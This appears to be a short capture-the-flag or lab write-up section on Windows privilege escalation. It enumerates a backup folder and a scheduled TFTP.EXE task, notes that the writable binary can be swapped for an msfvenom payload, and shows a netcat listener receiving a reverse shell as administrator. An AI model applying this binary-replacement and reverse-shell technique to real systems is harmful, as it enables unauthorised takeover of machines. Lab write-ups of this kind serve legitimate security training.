# 6 privesc

Nothing was working , more enumeration shows

```
C:\Backup>dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Backup

07/20/2020  07:08 AM    <DIR>          .
07/20/2020  07:08 AM    <DIR>          ..
06/12/2020  07:45 AM            11,304 backup.txt
06/12/2020  07:45 AM                73 info.txt
06/23/2020  07:49 PM            73,802 TFTP.EXE

C:\Backup>more info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt

# checking ownership of file
C:\Backup>dir /q
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Backup

07/20/2020  07:08 AM    <DIR>          ...                    .
07/20/2020  07:08 AM    <DIR>          NT SERVICE\TrustedInsta..
06/12/2020  07:45 AM            11,304 ...                    backup.txt
06/12/2020  07:45 AM                73 ...                    info.txt
06/23/2020  07:49 PM            73,802 SLORT\rupert           TFTP.EXE

# we can change TFTP.exe and use our own msfvenom payload

$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [192.168.49.105] from (UNKNOWN) [192.168.105.53] 50305
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
slort\administrator
```
